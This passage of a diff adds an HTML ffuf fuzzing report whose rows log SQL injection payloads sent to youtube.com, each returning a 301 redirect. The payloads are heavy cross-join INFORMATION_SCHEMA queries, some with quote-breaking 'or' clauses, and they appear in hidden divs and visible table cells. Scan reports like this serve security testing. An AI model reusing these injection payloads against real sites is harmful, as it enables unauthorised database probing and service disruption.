td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test|3|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;as&#43;test</td><td>3</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999|https://youtube.com/9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999|https://www.youtube.com/9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999|4|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999</td></td><td>https://youtube.com/9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999</td><td>https://www.youtube.com/9999&#39;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#39;0&#39;=&#39;9999</td><td>4</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#34;9999|https://youtube.com/9999&#34;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#34;9999|https://www.youtube.com/9999%22&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;%229999|7|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#34;9999</td></td><td>https://youtube.com/9999&#34;&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;&#34;9999</td><td>https://www.youtube.com/9999%22&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)&#43;%229999</td><td>7</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+        </tbody>
+      </table>
+
+        </div>
+        <br /><br />
+      </div>
+    </main>
+
+    
+	<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+    <script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.20/js/jquery.dataTables.js"></script>
+    <script>
+    $(document).ready(function() {
+        $('#ffufreport').DataTable(
+            {
+                "aLengthMenu": [
+                    [250, 500, 1000, 2500, -1],
+                    [250, 500, 1000, 2500, "All"]
+                ]
+            }
+        )
+        $('select').formSelect();
+        });
+    </script>
+    <style>
+      body {
+        display: flex;
+        min-height: 100vh;
+        flex-direction: column;
+      }
+
+      main {
+        flex: 1 0 auto;
+      }
+    </style>
+  </body>
+</html>
+
+	
